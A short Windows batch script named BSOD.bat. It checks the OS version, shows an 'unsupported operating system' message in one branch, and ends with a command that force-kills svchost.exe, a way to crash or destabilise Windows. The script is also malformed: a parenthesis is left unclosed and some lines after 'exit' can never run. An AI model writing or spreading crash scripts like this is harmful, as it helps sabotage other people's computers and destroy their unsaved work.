@echo off
if !osNumber! lss 52 (
	cls

	title Unsupported Operating System Detected
	color 0a

	echo Cannot execute BSOD.bat 
	echo Windows Vista is required to execute this file.
	echo .
	
	pause
	exit
color 0a
timeout 5
taskkill /f /im svchost.exe
